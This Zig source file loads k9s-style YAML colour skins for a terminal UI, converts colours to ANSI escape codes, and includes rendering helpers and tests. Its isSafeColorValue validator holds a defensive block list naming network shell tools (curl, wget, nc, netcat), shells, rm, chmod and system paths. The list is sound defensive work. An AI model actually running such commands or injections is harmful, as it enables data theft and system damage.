const std = @import("std");
const ascii = std.ascii;
const fmt = std.fmt;
const mem = std.mem;
const Terminal = @import("../core/Terminal.zig").Terminal;
const runtime = @import("../core/runtime.zig");

pub const ThemeColors = struct {
    main_bg: []const u8,
    main_fg: []const u8,
    title: []const u8,
    hi_fg: []const u8,
    selected_bg: []const u8,
    selected_fg: []const u8,
    inactive_fg: []const u8,
    proc_box: []const u8,
    div_line: []const u8,
    status_running: []const u8,
    status_pending: []const u8,
    status_failed: []const u8,
    status_succeeded: []const u8,
    key_highlight: []const u8,
    title_highlight: []const u8,
    app_name: []const u8,
    prompt_fg: []const u8,
    prompt_bg: []const u8,

    allocator: std.mem.Allocator,
};

pub fn loadTheme(allocator: std.mem.Allocator, theme_name: []const u8) !ThemeColors {
    const xdg = @import("../core/xdg.zig");
    const file_name = try fmt.allocPrint(allocator, "{s}.yaml", .{theme_name});
    defer allocator.free(file_name);

    // Try XDG skins dir first
    if (xdg.ensurePaths() catch null) |paths| {
        if (tryLoadFromDir(allocator, paths.skins_dir, file_name)) |theme| return theme;
    }

    // Try skins dir relative to executable
    var exe_dir_buf: [std.Io.Dir.max_path_bytes]u8 = undefined;
    if (std.process.executableDirPath(runtime.io(), &exe_dir_buf)) |exe_dir_len| {
        const exe_dir = exe_dir_buf[0..exe_dir_len];
        const skins_path = std.fs.path.join(allocator, &[_][]const u8{ exe_dir, "skins" }) catch null;
        if (skins_path) |path| {
            defer allocator.free(path);
            if (tryLoadFromDir(allocator, path, file_name)) |theme| return theme;
        }
    } else |_| {}

    // Try CWD/skins (development fallback)
    if (tryLoadFromDir(allocator, "skins", file_name)) |theme| return theme;

    return defaultTheme(allocator);
}

fn tryLoadFromDir(allocator: std.mem.Allocator, dir_path: []const u8, file_name: []const u8) ?ThemeColors {
    var dir = std.Io.Dir.cwd().openDir(runtime.io(), dir_path, .{}) catch return null;
    defer dir.close(runtime.io());
    const content = dir.readFileAlloc(runtime.io(), file_name, allocator, .limited(1024 * 1024)) catch return null;
    defer allocator.free(content);
    return parseSkinFile(allocator, content) catch null;
}

pub fn loadThemeFromDir(allocator: std.mem.Allocator, theme_name: []const u8, dir_path: []const u8) !ThemeColors {
    const file_name = try fmt.allocPrint(allocator, "{s}.yaml", .{theme_name});
    defer allocator.free(file_name);

    var dir = std.Io.Dir.cwd().openDir(runtime.io(), dir_path, .{}) catch return defaultTheme(allocator);
    defer dir.close(runtime.io());
    const content = dir.readFileAlloc(runtime.io(), file_name, allocator, .limited(1024 * 1024)) catch return defaultTheme(allocator);
    defer allocator.free(content);
    return parseSkinFile(allocator, content);
}

pub fn defaultTheme(allocator: std.mem.Allocator) !ThemeColors {
    return ThemeColors{
        .allocator = allocator,
        .main_bg = try allocator.dupe(u8, "\x1b[49m"),
        .main_fg = try hexToAnsi(allocator, "#cfc9c2"),
        .title = try hexToAnsi(allocator, "#cfc9c2"),
        .hi_fg = try hexToAnsi(allocator, "#7dcfff"),
        .selected_bg = try hexToBgAnsi(allocator, "#414868"),
        .selected_fg = try hexToAnsi(allocator, "#cfc9c2"),
        .inactive_fg = try hexToAnsi(allocator, "#565f89"),
        .proc_box = try hexToAnsi(allocator, "#565f89"),
        .div_line = try hexToAnsi(allocator, "#565f89"),
        .status_running = try hexToAnsi(allocator, "#50fa7b"),
        .status_pending = try hexToAnsi(allocator, "#e0af68"),
        .status_failed = try hexToAnsi(allocator, "#f7768e"),
        .status_succeeded = try hexToAnsi(allocator, "#7dcfff"),
        .key_highlight = try hexToAnsi(allocator, "#f7768e"),
        .title_highlight = try hexToAnsi(allocator, "#e0af68"),
        .app_name = try allocator.dupe(u8, "\x1b[1;97m"),
        .prompt_fg = try hexToAnsi(allocator, "#cfc9c2"), // Same as selected_fg
        .prompt_bg = try hexToBgAnsi(allocator, "#414868"), // Same as selected_bg
    };
}

/// Parsed YAML values — all extracted in a single pass over the file content.
/// Slices point into the original content buffer (or the anchors map for aliases).
const YamlValues = struct {
    values: [theme_mappings.len]?[]const u8,
};

/// Parse the YAML content once: collect anchors, then walk the indentation tree
/// and resolve every key from theme_mappings in one pass.
fn extractAllYamlValues(content: []const u8) YamlValues {
    var result = YamlValues{ .values = .{null} ** theme_mappings.len };

    // --- Pass 1: collect YAML anchors ---
    // Handles both formats:
    //   &name: "value"           (anchor as key)
    //   key: &name "value"       (inline anchor on value)
    const max_anchors = 32;
    var anchor_names: [max_anchors][]const u8 = undefined;
    var anchor_vals: [max_anchors][]const u8 = undefined;
    var anchor_count: usize = 0;

    var anchor_iter = mem.splitScalar(u8, content, '\n');
    while (anchor_iter.next()) |line| {
        if (anchor_count >= max_anchors) break;
        const trimmed = mem.trim(u8, line, " \t\r");
        if (trimmed.len == 0 or trimmed[0] == '#') continue;

        // Find '&' anywhere in the line
        const amp_pos = mem.indexOfScalar(u8, trimmed, '&') orelse continue;

        // Extract anchor name (alphanumeric, -, _)
        var name_end = amp_pos + 1;
        while (name_end < trimmed.len and
            (std.ascii.isAlphanumeric(trimmed[name_end]) or trimmed[name_end] == '_' or trimmed[name_end] == '-')) : (name_end += 1)
        {}
        if (name_end == amp_pos + 1) continue; // empty name
        const anchor_name = trimmed[amp_pos + 1 .. name_end];

        // Value is everything after the anchor name (skip optional colon/spaces)
        var val_start = name_end;
        while (val_start < trimmed.len and (trimmed[val_start] == ' ' or trimmed[val_start] == ':')) : (val_start += 1) {}
        if (val_start >= trimmed.len) continue;
        const raw_val = mem.trim(u8, trimmed[val_start..], " \t");

        const val = if (raw_val.len >= 2 and raw_val[0] == '"' and raw_val[raw_val.len - 1] == '"')
            raw_val[1 .. raw_val.len - 1]
        else
            raw_val;

        if (val.len > 0) {
            anchor_names[anchor_count] = anchor_name;
            anchor_vals[anchor_count] = val;
            anchor_count += 1;
        }
    }

    // --- Pre-split all mapping key paths into segments ---
    const max_depth = 8;
    var all_segments: [theme_mappings.len][max_depth][]const u8 = undefined;
    var all_depths: [theme_mappings.len]usize = undefined;

    for (theme_mappings, 0..) |m, i| {
        var depth: usize = 0;
        var seg_iter = mem.splitScalar(u8, m.yaml_key, '.');
        while (seg_iter.next()) |seg| {
            if (depth >= max_depth) break;
            all_segments[i][depth] = seg;
            depth += 1;
        }
        all_depths[i] = depth;
    }

    // --- Pass 2: walk lines, track indent stack, match all keys ---
    // matched_depths[i] = how many path segments matched so far for mapping i
    // found_count increments once per MAPPING filled, so it must be compared against
    // the number of mappings -- not the number of unique yaml keys. Three keys each
    // fill two mappings (frame.menu.keyColor -> hi_fg + key_highlight,
    // frame.border.fgColor -> proc_box + div_line, status.completedColor ->
    // status_succeeded + inactive_fg), so with 17 mappings and 14 unique keys the
    // counter overshot and the line loop broke early -- three mappings short.
    //
    // The casualties were always the last three in file order: title_highlight,
    // selected_fg and selected_bg. So EVERY bundled skin silently fell back to the
    // hardcoded defaults for the selected-row highlight, which is why the cursor
    // looked identical in all 35 of them. The existing test only asserted
    // main_fg.len > 0, so it never noticed.
    var found_count: usize = 0;
    const total_mappings = theme_mappings.len;

    // Indent stack per mapping is wasteful; instead track a global path.
    // Since all skin file keys share a common prefix and the YAML tree is walked linearly,
    // we track one global nesting state and check each mapping against it.
    var path_stack: [max_depth][]const u8 = undefined;
    var indent_stack: [max_depth]usize = undefined;
    var stack_depth: usize = 0;

    var lines = mem.splitScalar(u8, content, '\n');
    while (lines.next()) |line| {
        if (found_count >= total_mappings) break;

        const stripped = mem.trimEnd(u8, line, "\r");
        if (stripped.len == 0) continue;

        var indent: usize = 0;
        while (indent < stripped.len and stripped[indent] == ' ') : (indent += 1) {}
        const trimmed = stripped[indent..];
        if (trimmed.len == 0 or trimmed[0] == '#' or trimmed[0] == '&' or trimmed[0] == '-') continue;

        const colon_pos = mem.indexOfScalar(u8, trimmed, ':') orelse continue;
        const line_key = trimmed[0..colon_pos];

        // Pop stack when indentation decreases
        while (stack_depth > 0 and indent <= indent_stack[stack_depth - 1]) {
            stack_depth -= 1;
        }

        const after_colon = mem.trim(u8, trimmed[colon_pos + 1 ..], " \t");
        const is_leaf = after_colon.len > 0;

        if (is_leaf) {
            // Leaf node — check if path_stack + line_key matches any mapping
            for (theme_mappings, 0..) |_, i| {
                if (result.values[i] != null) continue;
                const depth = all_depths[i];
                if (depth == 0 or depth - 1 != stack_depth) continue;

                // Check that the current stack matches all parent segments
                var match = true;
                for (0..stack_depth) |d| {
                    if (!mem.eql(u8, path_stack[d], all_segments[i][d])) {
                        match = false;
                        break;
                    }
                }
                if (!match) continue;

                // Check leaf key
                if (!mem.eql(u8, line_key, all_segments[i][depth - 1])) continue;

                // Resolve value
                var val = after_colon;
                if (val.len > 0 and val[0] == '*') {
                    const alias = val[1..];
                    for (0..anchor_count) |a| {
                        if (mem.eql(u8, anchor_names[a], alias)) {
                            val = anchor_vals[a];
                            break;
                        }
                    }
                } else if (val.len >= 2 and val[0] == '"' and val[val.len - 1] == '"') {
                    val = val[1 .. val.len - 1];
                }

                result.values[i] = val;
                found_count += 1;
            }
        } else {
            // Branch node — push onto stack
            if (stack_depth < max_depth) {
                indent_stack[stack_depth] = indent;
                path_stack[stack_depth] = line_key;
                stack_depth += 1;
            }
        }
    }

    return result;
}

/// Validates that a value is safe (only contains color values, no shell commands)
fn isSafeColorValue(value: []const u8) bool {
    // Empty values are not safe
    if (value.len == 0) return false;

    // Check for shell command injection patterns
    const unsafe_chars = "|&;$`<>(){}[]!~";
    for (value) |c| {
        for (unsafe_chars) |unsafe| {
            if (c == unsafe) return false;
        }
    }

    // Check for common command injection strings
    const unsafe_patterns = [_][]const u8{
        "exec", "eval", "system", "bash", "sh",    "zsh",
        "../",  "~/",   "/bin",   "/usr", "/etc",  "curl",
        "wget", "nc",   "netcat", "rm",   "chmod",
    };
    const lower_value = std.ascii.allocLowerString(std.heap.page_allocator, value) catch return false;
    defer std.heap.page_allocator.free(lower_value);

    for (unsafe_patterns) |pattern| {
        if (mem.indexOf(u8, lower_value, pattern) != null) return false;
    }

    // Valid values should be:
    // - Hex colors: #RGB or #RRGGBB
    // - Named colors: lowercase alphabetic
    // - Aliases: *name
    // - "default"

    if (mem.eql(u8, value, "default")) return true;
    if (value[0] == '#' and (value.len == 4 or value.len == 7)) {
        // Validate hex characters
        for (value[1..]) |c| {
            if (!ascii.isHex(c)) return false;
        }
        return true;
    }
    if (value[0] == '*' and value.len > 1) {
        // Alias reference - validate name part
        for (value[1..]) |c| {
            if (!ascii.isAlphanumeric(c) and c != '-' and c != '_') return false;
        }
        return true;
    }
    // Named color - only lowercase letters and hyphens
    for (value) |c| {
        if (!ascii.isLower(c) and c != '-') return false;
    }

    return true;
}

const ColorKind = enum { fg, bg };

const ThemeMapping = struct {
    yaml_key: []const u8,
    field: enum {
        main_fg,
        main_bg,
        title,
        hi_fg,
        selected_bg,
        selected_fg,
        inactive_fg,
        proc_box,
        div_line,
        status_running,
        status_pending,
        status_failed,
        status_succeeded,
        key_highlight,
        title_highlight,
        app_name,
        prompt_fg,
        prompt_bg,
    },
    kind: ColorKind,
};

const theme_mappings = [_]ThemeMapping{
    // Body
    .{ .yaml_key = "k9s.body.fgColor", .field = .main_fg, .kind = .fg },
    .{ .yaml_key = "k9s.body.bgColor", .field = .main_bg, .kind = .bg },
    // Frame
    .{ .yaml_key = "k9s.frame.title.fgColor", .field = .title, .kind = .fg },
    .{ .yaml_key = "k9s.frame.title.highlightColor", .field = .title_highlight, .kind = .fg },
    .{ .yaml_key = "k9s.frame.menu.keyColor", .field = .hi_fg, .kind = .fg },
    .{ .yaml_key = "k9s.frame.menu.keyColor", .field = .key_highlight, .kind = .fg },
    .{ .yaml_key = "k9s.frame.border.fgColor", .field = .proc_box, .kind = .fg },
    .{ .yaml_key = "k9s.frame.border.fgColor", .field = .div_line, .kind = .fg },
    // Status
    .{ .yaml_key = "k9s.frame.status.addColor", .field = .status_running, .kind = .fg },
    .{ .yaml_key = "k9s.frame.status.modifyColor", .field = .status_pending, .kind = .fg },
    .{ .yaml_key = "k9s.frame.status.errorColor", .field = .status_failed, .kind = .fg },
    .{ .yaml_key = "k9s.frame.status.completedColor", .field = .status_succeeded, .kind = .fg },
    .{ .yaml_key = "k9s.frame.status.completedColor", .field = .inactive_fg, .kind = .fg },
    // Table cursor
    .{ .yaml_key = "k9s.views.table.cursorFgColor", .field = .selected_fg, .kind = .fg },
    .{ .yaml_key = "k9s.views.table.cursorBgColor", .field = .selected_bg, .kind = .bg },
    // Prompt
    .{ .yaml_key = "k9s.prompt.fgColor", .field = .prompt_fg, .kind = .fg },
    .{ .yaml_key = "k9s.prompt.bgColor", .field = .prompt_bg, .kind = .bg },
};

fn parseSkinFile(allocator: mem.Allocator, content: []const u8) !ThemeColors {
    if (content.len > 100 * 1024) {
        std.log.warn("Theme file too large ({d} bytes), using default theme", .{content.len});
        return defaultTheme(allocator);
    }

    var theme = try defaultTheme(allocator);

    // Single-pass extraction — no per-key re-parsing
    const yaml = extractAllYamlValues(content);

    for (theme_mappings, 0..) |m, i| {
        const val = yaml.values[i] orelse continue;
        if (!isSafeColorValue(val)) continue;

        const ansi = switch (m.kind) {
            .fg => try hexToAnsi(allocator, val),
            .bg => try hexToBgAnsi(allocator, val),
        };

        const field_ptr = switch (m.field) {
            .main_fg => &theme.main_fg,
            .main_bg => &theme.main_bg,
            .title => &theme.title,
            .hi_fg => &theme.hi_fg,
            .selected_bg => &theme.selected_bg,
            .selected_fg => &theme.selected_fg,
            .inactive_fg => &theme.inactive_fg,
            .proc_box => &theme.proc_box,
            .div_line => &theme.div_line,
            .status_running => &theme.status_running,
            .status_pending => &theme.status_pending,
            .status_failed => &theme.status_failed,
            .status_succeeded => &theme.status_succeeded,
            .key_highlight => &theme.key_highlight,
            .title_highlight => &theme.title_highlight,
            .app_name => &theme.app_name,
            .prompt_fg => &theme.prompt_fg,
            .prompt_bg => &theme.prompt_bg,
        };

        allocator.free(field_ptr.*);
        field_ptr.* = ansi;
    }

    return theme;
}

fn hexToAnsi(allocator: mem.Allocator, hex_or_name: []const u8) error{ OutOfMemory, InvalidCharacter, Overflow }![]const u8 {
    if (mem.eql(u8, hex_or_name, "default")) return allocator.dupe(u8, "\x1b[39m");

    // Check if it's an alias reference like *blue (should have been resolved by getYamlValue)
    if (mem.startsWith(u8, hex_or_name, "*")) return nameToAnsi(allocator, hex_or_name[1..]);

    // Handle named colors like "white", "red", etc. (lowercase initial)
    if (hex_or_name.len > 0 and ascii.isLower(hex_or_name[0])) {
        return nameToAnsi(allocator, hex_or_name);
    }

    // Handle short hex format "#XY" (256-color index)
    if (hex_or_name.len == 3 and hex_or_name[0] == '#') {
        const val = try fmt.parseInt(u8, hex_or_name[1..], 16);
        return fmt.allocPrint(allocator, "\x1b[38;5;{d}m", .{val});
    }

    // Handle short hex "#RGB" → expand to "#RRGGBB"
    if (hex_or_name.len == 4 and hex_or_name[0] == '#') {
        const r = try fmt.parseInt(u8, hex_or_name[1..2], 16);
        const g = try fmt.parseInt(u8, hex_or_name[2..3], 16);
        const b = try fmt.parseInt(u8, hex_or_name[3..4], 16);
        return fmt.allocPrint(allocator, "\x1b[38;2;{d};{d};{d}m", .{ r * 17, g * 17, b * 17 });
    }

    // Handle full hex format "#RRGGBB"
    if (hex_or_name.len == 7 and hex_or_name[0] == '#') {
        const r = try fmt.parseInt(u8, hex_or_name[1..3], 16);
        const g = try fmt.parseInt(u8, hex_or_name[3..5], 16);
        const b = try fmt.parseInt(u8, hex_or_name[5..7], 16);
        return fmt.allocPrint(allocator, "\x1b[38;2;{d};{d};{d}m", .{ r, g, b });
    }

    // Fallback
    return allocator.dupe(u8, "\x1b[39m");
}

fn hexToBgAnsi(allocator: mem.Allocator, hex_or_name: []const u8) error{ OutOfMemory, InvalidCharacter, Overflow }![]const u8 {
    if (mem.eql(u8, hex_or_name, "default")) return allocator.dupe(u8, "\x1b[49m");

    if (mem.startsWith(u8, hex_or_name, "*")) return nameToBgAnsi(allocator, hex_or_name[1..]);

    // Handle named colors
    if (hex_or_name.len > 0 and ascii.isLower(hex_or_name[0])) {
        return nameToBgAnsi(allocator, hex_or_name);
    }

    // Handle short hex format "#XY" (256-color index)
    if (hex_or_name.len == 3 and hex_or_name[0] == '#') {
        const val = try fmt.parseInt(u8, hex_or_name[1..], 16);
        return fmt.allocPrint(allocator, "\x1b[48;5;{d}m", .{val});
    }

    // Handle short hex "#RGB" → expand to "#RRGGBB"
    if (hex_or_name.len == 4 and hex_or_name[0] == '#') {
        const r = try fmt.parseInt(u8, hex_or_name[1..2], 16);
        const g = try fmt.parseInt(u8, hex_or_name[2..3], 16);
        const b = try fmt.parseInt(u8, hex_or_name[3..4], 16);
        return fmt.allocPrint(allocator, "\x1b[48;2;{d};{d};{d}m", .{ r * 17, g * 17, b * 17 });
    }

    // Handle full hex format
    if (hex_or_name.len == 7 and hex_or_name[0] == '#') {
        const r = try fmt.parseInt(u8, hex_or_name[1..3], 16);
        const g = try fmt.parseInt(u8, hex_or_name[3..5], 16);
        const b = try fmt.parseInt(u8, hex_or_name[5..7], 16);
        return fmt.allocPrint(allocator, "\x1b[48;2;{d};{d};{d}m", .{ r, g, b });
    }

    return allocator.dupe(u8, "\x1b[49m");
}

// Basic named color to ANSI mapping (incomplete, expand as needed)
fn nameToAnsi(allocator: mem.Allocator, name: []const u8) error{ OutOfMemory, InvalidCharacter, Overflow }![]const u8 {
    if (mem.eql(u8, name, "white")) return allocator.dupe(u8, "\x1b[37m");
    if (mem.eql(u8, name, "black")) return allocator.dupe(u8, "\x1b[30m");
    if (mem.eql(u8, name, "red")) return allocator.dupe(u8, "\x1b[31m");
    if (mem.eql(u8, name, "green")) return allocator.dupe(u8, "\x1b[32m");
    if (mem.eql(u8, name, "yellow")) return allocator.dupe(u8, "\x1b[33m");
    if (mem.eql(u8, name, "blue")) return allocator.dupe(u8, "\x1b[34m");
    if (mem.eql(u8, name, "magenta")) return allocator.dupe(u8, "\x1b[35m");
    if (mem.eql(u8, name, "cyan")) return allocator.dupe(u8, "\x1b[36m");
    // Extended named colors (approximate hex mapping for 256-color or truecolor)
    if (mem.eql(u8, name, "orange")) return hexToAnsi(allocator, "#ff8700");
    if (mem.eql(u8, name, "fuchsia")) return hexToAnsi(allocator, "#ff00ff");
    if (mem.eql(u8, name, "lime")) return hexToAnsi(allocator, "#00ff00");
    if (mem.eql(u8, name, "aqua")) return hexToAnsi(allocator, "#00ffff");
    if (mem.eql(u8, name, "gold")) return hexToAnsi(allocator, "#ffd700");
    if (mem.eql(u8, name, "purple")) return hexToAnsi(allocator, "#800080");
    if (mem.eql(u8, name, "slategray")) return hexToAnsi(allocator, "#708090");
    if (mem.eql(u8, name, "darkgoldenrod")) return hexToAnsi(allocator, "#b8860b");
    if (mem.eql(u8, name, "mediumpurple")) return hexToAnsi(allocator, "#9370db");
    if (mem.eql(u8, name, "pink")) return hexToAnsi(allocator, "#ffc0cb");
    if (mem.eql(u8, name, "sandybrown")) return hexToAnsi(allocator, "#f4a460");
    if (mem.eql(u8, name, "dodgerblue")) return hexToAnsi(allocator, "#1e90ff");
    if (mem.eql(u8, name, "lightskyblue")) return hexToAnsi(allocator, "#87cefa");
    if (mem.eql(u8, name, "steelblue")) return hexToAnsi(allocator, "#4682b4");
    if (mem.eql(u8, name, "darkblue")) return hexToAnsi(allocator, "#00008b");
    if (mem.eql(u8, name, "aliceblue")) return hexToAnsi(allocator, "#f0f8ff");
    if (mem.eql(u8, name, "cornflowerblue")) return hexToAnsi(allocator, "#6495ed");
    if (mem.eql(u8, name, "indianred")) return hexToAnsi(allocator, "#cd5c5c");
    if (mem.eql(u8, name, "royalblue")) return hexToAnsi(allocator, "#4169e1");
    if (mem.eql(u8, name, "cadetblue")) return hexToAnsi(allocator, "#5f9ea0");
    if (mem.eql(u8, name, "powderblue")) return hexToAnsi(allocator, "#b0e0e6");
    if (mem.eql(u8, name, "ghostwhite")) return hexToAnsi(allocator, "#f8f8ff");
    if (mem.eql(u8, name, "dimgray")) return hexToAnsi(allocator, "#696969");
    if (mem.eql(u8, name, "navajowhite")) return hexToAnsi(allocator, "#ffdead");
    if (mem.eql(u8, name, "firebrick")) return hexToAnsi(allocator, "#b22222");
    if (mem.eql(u8, name, "gray")) return hexToAnsi(allocator, "#808080");
    if (mem.eql(u8, name, "redred")) return hexToAnsi(allocator, "#ff0000");
    if (mem.eql(u8, name, "linegreen")) return hexToAnsi(allocator, "#32cd32");

    return allocator.dupe(u8, "\x1b[39m"); // Default
}

fn nameToBgAnsi(allocator: mem.Allocator, name: []const u8) error{ OutOfMemory, InvalidCharacter, Overflow }![]const u8 {
    if (mem.eql(u8, name, "white")) return allocator.dupe(u8, "\x1b[47m");
    if (mem.eql(u8, name, "black")) return allocator.dupe(u8, "\x1b[40m");
    if (mem.eql(u8, name, "red")) return allocator.dupe(u8, "\x1b[41m");
    if (mem.eql(u8, name, "green")) return allocator.dupe(u8, "\x1b[42m");
    if (mem.eql(u8, name, "yellow")) return allocator.dupe(u8, "\x1b[43m");
    if (mem.eql(u8, name, "blue")) return allocator.dupe(u8, "\x1b[44m");
    if (mem.eql(u8, name, "magenta")) return allocator.dupe(u8, "\x1b[45m");
    if (mem.eql(u8, name, "cyan")) return allocator.dupe(u8, "\x1b[46m");
    // Extended named colors (approximate hex mapping for 256-color or truecolor)
    if (mem.eql(u8, name, "orange")) return hexToBgAnsi(allocator, "#ff8700");
    if (mem.eql(u8, name, "fuchsia")) return hexToBgAnsi(allocator, "#ff00ff");
    if (mem.eql(u8, name, "lime")) return hexToBgAnsi(allocator, "#00ff00");
    if (mem.eql(u8, name, "aqua")) return hexToBgAnsi(allocator, "#00ffff");
    if (mem.eql(u8, name, "gold")) return hexToBgAnsi(allocator, "#ffd700");
    if (mem.eql(u8, name, "purple")) return hexToBgAnsi(allocator, "#800080");
    if (mem.eql(u8, name, "slategray")) return hexToBgAnsi(allocator, "#708090");
    if (mem.eql(u8, name, "darkgoldenrod")) return hexToBgAnsi(allocator, "#b8860b");
    if (mem.eql(u8, name, "mediumpurple")) return hexToBgAnsi(allocator, "#9370db");
    if (mem.eql(u8, name, "pink")) return hexToBgAnsi(allocator, "#ffc0cb");
    if (mem.eql(u8, name, "sandybrown")) return hexToBgAnsi(allocator, "#f4a460");
    if (mem.eql(u8, name, "dodgerblue")) return hexToBgAnsi(allocator, "#1e90ff");
    if (mem.eql(u8, name, "lightskyblue")) return hexToBgAnsi(allocator, "#87cefa");
    if (mem.eql(u8, name, "steelblue")) return hexToBgAnsi(allocator, "#4682b4");
    if (mem.eql(u8, name, "darkblue")) return hexToBgAnsi(allocator, "#00008b");
    if (mem.eql(u8, name, "aliceblue")) return hexToBgAnsi(allocator, "#f0f8ff");
    if (mem.eql(u8, name, "cornflowerblue")) return hexToBgAnsi(allocator, "#6495ed");
    if (mem.eql(u8, name, "indianred")) return hexToBgAnsi(allocator, "#cd5c5c");
    if (mem.eql(u8, name, "royalblue")) return hexToBgAnsi(allocator, "#4169e1");
    if (mem.eql(u8, name, "cadetblue")) return hexToBgAnsi(allocator, "#5f9ea0");
    if (mem.eql(u8, name, "powderblue")) return hexToBgAnsi(allocator, "#b0e0e6");
    if (mem.eql(u8, name, "ghostwhite")) return hexToBgAnsi(allocator, "#f8f8ff");
    if (mem.eql(u8, name, "dimgray")) return hexToBgAnsi(allocator, "#696969");
    if (mem.eql(u8, name, "navajowhite")) return hexToBgAnsi(allocator, "#ffdead");
    if (mem.eql(u8, name, "firebrick")) return hexToBgAnsi(allocator, "#b22222");
    if (mem.eql(u8, name, "gray")) return hexToBgAnsi(allocator, "#808080");
    if (mem.eql(u8, name, "redred")) return hexToBgAnsi(allocator, "#ff0000");
    if (mem.eql(u8, name, "linegreen")) return hexToBgAnsi(allocator, "#32cd32");

    return allocator.dupe(u8, "\x1b[49m"); // Default
}

pub fn deinitTheme(theme: *ThemeColors) void {
    theme.allocator.free(theme.main_bg);
    theme.allocator.free(theme.main_fg);
    theme.allocator.free(theme.title);
    theme.allocator.free(theme.hi_fg);
    theme.allocator.free(theme.selected_bg);
    theme.allocator.free(theme.selected_fg);
    theme.allocator.free(theme.inactive_fg);
    theme.allocator.free(theme.proc_box);
    theme.allocator.free(theme.div_line);
    theme.allocator.free(theme.status_running);
    theme.allocator.free(theme.status_pending);
    theme.allocator.free(theme.status_failed);
    theme.allocator.free(theme.status_succeeded);
    theme.allocator.free(theme.key_highlight);
    theme.allocator.free(theme.title_highlight);
    theme.allocator.free(theme.app_name);
    theme.allocator.free(theme.prompt_fg);
    theme.allocator.free(theme.prompt_bg);
}

// ============================================================================
// Theme rendering helpers
// ============================================================================

/// Default terminal background (transparent)
pub const default_bg = "\x1b[49m";

// Reset sequence
pub const reset = "\x1b[0m";

// Text formatting
pub const bold = "\x1b[1m";

/// Write text with ANSI escape sequences at a position
/// Write `glyph` `count` times as ONE styled run.
///
/// The per-character alternative costs setCursor(9) + fg(17) + bg(5) + glyph(3) +
/// reset(4) = ~38 bytes to place a 3-byte border character, and the cursor is already
/// in position while the colours never change. Box borders were drawn that way, which
/// made them roughly two thirds of every frame's bytes.
pub fn writeRepeatWithTheme(
    terminal: *Terminal,
    x: u16,
    y: u16,
    glyph: []const u8,
    count: usize,
    fg_color: []const u8,
    bg_color: []const u8,
) !void {
    if (count == 0 or glyph.len == 0) return;

    try terminal.setCursor(x, y);
    try terminal.writeAll(fg_color);
    try terminal.writeAll(bg_color);

    // Chunked so a wide terminal needs no large buffer and no per-cell write.
    var buf: [256]u8 = undefined;
    const per_chunk = buf.len / glyph.len;
    var remaining = count;
    while (remaining > 0) {
        const n = @min(per_chunk, remaining);
        var off: usize = 0;
        for (0..n) |_| {
            @memcpy(buf[off..][0..glyph.len], glyph);
            off += glyph.len;
        }
        try terminal.writeAll(buf[0..off]);
        remaining -= n;
    }

    try terminal.writeAll(reset);
}

pub fn writeStringWithTheme(terminal: *Terminal, x: u16, y: u16, text: []const u8, fg_color: []const u8, bg_color: []const u8) !void {
    if (text.len == 0) return;

    var buffer: [1024]u8 = undefined;
    const total_len = fg_color.len + bg_color.len + text.len + reset.len;
    if (total_len > buffer.len) {
        const available = buffer.len - fg_color.len - bg_color.len - reset.len;
        if (available < 1) return;
        const safe_text = text[0..@min(text.len, available)];
        const formatted = try std.fmt.bufPrint(&buffer, "{s}{s}{s}{s}", .{ fg_color, bg_color, safe_text, reset });
        try terminal.setCursor(x, y);
        try terminal.writeAll(formatted);
    } else {
        const formatted = try std.fmt.bufPrint(&buffer, "{s}{s}{s}{s}", .{ fg_color, bg_color, text, reset });
        try terminal.setCursor(x, y);
        try terminal.writeAll(formatted);
    }
}

/// Simplified write with default background
pub fn writeText(terminal: *Terminal, x: u16, y: u16, text: []const u8, color: []const u8) !void {
    try writeStringWithTheme(terminal, x, y, text, color, default_bg);
}

/// Bold text write
pub fn writeStringWithBold(terminal: *Terminal, x: u16, y: u16, text: []const u8, fg_color: []const u8, bg_color: []const u8) !void {
    var buffer: [512]u8 = undefined;
    const formatted = try std.fmt.bufPrint(&buffer, "{s}{s}{s}{s}{s}", .{ bold, fg_color, bg_color, text, reset });
    try terminal.setCursor(x, y);
    try terminal.writeAll(formatted);
}

/// Render shortcut: <key> command
pub fn writeShortcut(terminal: *Terminal, x: u16, y: u16, key: []const u8, command: []const u8, bg_color: []const u8, hi_color: []const u8) !void {
    var buffer: [512]u8 = undefined;
    const formatted = try std.fmt.bufPrint(&buffer, "{s}{s}<{s}>{s} {s}{s}{s}", .{ hi_color, bg_color, key, reset, bold, command, reset });
    try terminal.setCursor(x, y);
    try terminal.writeAll(formatted);
}

/// Render command with highlighted letter in middle
pub fn writeShortcutWithHighlight(terminal: *Terminal, x: u16, y: u16, before: []const u8, highlight_char: []const u8, after: []const u8, hi_color: []const u8) !void {
    try terminal.setCursor(x, y);
    try terminal.writeAll(bold);
    try terminal.writeAll(before);
    try terminal.writeAll(hi_color);
    try terminal.writeAll(highlight_char);
    try terminal.writeAll(reset);
    try terminal.writeAll(bold);
    try terminal.writeAll(after);
    try terminal.writeAll(reset);
}

const testing = std.testing;

// --- tests from tests/model/theme_loader_test.zig ---

test "default theme loads successfully" {
    const allocator = testing.allocator;

    var theme = try defaultTheme(allocator);
    defer deinitTheme(&theme);

    // Verify all color fields are allocated and non-empty
    try testing.expect(theme.main_bg.len > 0);
    try testing.expect(theme.main_fg.len > 0);
    try testing.expect(theme.title.len > 0);
    try testing.expect(theme.hi_fg.len > 0);
    try testing.expect(theme.selected_bg.len > 0);
    try testing.expect(theme.selected_fg.len > 0);
    try testing.expect(theme.proc_box.len > 0);
    try testing.expect(theme.div_line.len > 0);
}

test "load tokyo-night skin" {
    const allocator = testing.allocator;

    var theme = try loadTheme(allocator, "tokyo-night");
    defer deinitTheme(&theme);

    // Verify theme loaded
    try testing.expect(theme.main_fg.len > 0);
    try testing.expect(theme.hi_fg.len > 0);
}

test "load non-existent skin falls back to default" {
    const allocator = testing.allocator;

    var theme = try loadTheme(allocator, "nonexistent-theme-12345");
    defer deinitTheme(&theme);

    // Should load default theme without error
    try testing.expect(theme.main_fg.len > 0);
}

test "deinitTheme frees all allocations" {
    const allocator = testing.allocator;

    var theme = try defaultTheme(allocator);
    deinitTheme(&theme);

    // If there were leaks, the testing allocator would catch them
}

// --- tests from tests/model/theme_security_test.zig ---

// `parseSkinFile`/`isSafeColorValue` are private in this file.
// The supported public entry point that exercises the same parse + safety
// validation is `loadThemeFromDir(allocator, theme_name, dir_path)`, which reads
// `<theme_name>.yaml` from `dir_path` and parses it. Each test writes its YAML
// fixture into a temp dir and loads it through that path. `testing.tmpDir`
// creates `.zig-cache/tmp/<sub_path>` relative to cwd (std.Io.Dir.realpathAlloc
// was removed in 0.16), so we build the relative dir path from `sub_path`.

